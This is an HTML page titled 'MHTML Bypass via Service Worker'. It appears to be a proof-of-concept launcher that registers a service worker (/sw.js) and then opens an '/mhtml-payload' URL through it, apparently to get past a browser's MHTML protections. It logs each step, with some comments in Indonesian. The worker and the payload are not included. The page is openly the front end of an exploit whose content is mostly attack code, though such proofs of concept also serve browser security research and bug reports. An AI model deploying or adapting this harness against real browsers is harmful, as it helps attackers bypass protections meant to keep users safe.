<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>MHTML SW Bypass</title></head>
<body>
<h1>MHTML Bypass via Service Worker</h1>
<button id="start">Start Bypass</button>
<div id="log"></div>

<script>
document.getElementById('start').addEventListener('click', async () => {
  const log = (msg) => {
    document.getElementById('log').innerHTML += '<div>' + msg + '</div>';
    console.log(msg);
  };

  // 1. Register Service Worker
  if (!('serviceWorker' in navigator)) {
    log('❌ Service Worker not supported');
    return;
  }

  try {
    const reg = await navigator.serviceWorker.register('/sw.js');
    log('✅ Service Worker registered');

    // 2. Tunggu sampai SW aktif
    await navigator.serviceWorker.ready;
    log('✅ Service Worker ready');

    // 3. Buka MHTML payload via SW
    log('Opening MHTML payload...');
    const win = window.open('/mhtml-payload', '_blank');
    if (!win) {
      log('❌ Popup blocked');
    } else {
      log('✅ MHTML opened via SW');
    }

  } catch (e) {
    log('❌ Error: ' + e.message);
  }
});
</script>
</body>
</html>
